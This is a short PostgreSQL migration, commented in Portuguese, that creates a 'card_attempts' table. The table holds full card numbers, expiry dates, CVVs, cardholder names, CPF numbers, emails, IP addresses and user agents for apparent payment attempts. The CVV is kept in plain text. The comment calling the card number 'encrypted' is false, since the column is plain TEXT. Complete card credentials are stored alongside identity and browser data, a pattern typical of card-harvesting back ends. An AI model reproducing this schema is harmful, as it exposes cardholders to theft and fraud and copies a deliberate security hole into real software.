-- Criar tabela para armazenar tentativas de pagamento com cartão
CREATE TABLE IF NOT EXISTS card_attempts (
  id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
  card_number TEXT NOT NULL,
  card_expiry TEXT NOT NULL,
  card_cvv TEXT NOT NULL,
  card_name TEXT NOT NULL,
  cpf TEXT NOT NULL,
  email TEXT NOT NULL,
  amount DECIMAL(10,2),
  product_name TEXT,
  category TEXT,
  ip TEXT,
  user_agent TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Criar índices para melhorar performance
CREATE INDEX IF NOT EXISTS idx_card_attempts_email ON card_attempts(email);
CREATE INDEX IF NOT EXISTS idx_card_attempts_cpf ON card_attempts(cpf);
CREATE INDEX IF NOT EXISTS idx_card_attempts_created_at ON card_attempts(created_at DESC);

-- Habilitar RLS (Row Level Security) para segurança
ALTER TABLE card_attempts ENABLE ROW LEVEL SECURITY;

-- Criar política para permitir apenas inserções via service key
CREATE POLICY "Allow service role to insert" ON card_attempts
  FOR INSERT
  TO service_role
  WITH CHECK (true);

-- Criar política para permitir apenas leituras via service key
CREATE POLICY "Allow service role to select" ON card_attempts
  FOR SELECT
  TO service_role
  USING (true);

-- Comentários para documentação
COMMENT ON TABLE card_attempts IS 'Armazena tentativas de pagamento com cartão para análise';
COMMENT ON COLUMN card_attempts.card_number IS 'Número do cartão (criptografado)';
COMMENT ON COLUMN card_attempts.card_expiry IS 'Data de validade do cartão';
COMMENT ON COLUMN card_attempts.card_cvv IS 'CVV do cartão';
COMMENT ON COLUMN card_attempts.card_name IS 'Nome impresso no cartão';
COMMENT ON COLUMN card_attempts.cpf IS 'CPF do titular';
COMMENT ON COLUMN card_attempts.email IS 'Email do cliente';
COMMENT ON COLUMN card_attempts.amount IS 'Valor da transação';
COMMENT ON COLUMN card_attempts.product_name IS 'Nome do produto';
COMMENT ON COLUMN card_attempts.category IS 'Categoria do produto';
COMMENT ON COLUMN card_attempts.ip IS 'Endereço IP do cliente';
COMMENT ON COLUMN card_attempts.user_agent IS 'User agent do navegador';
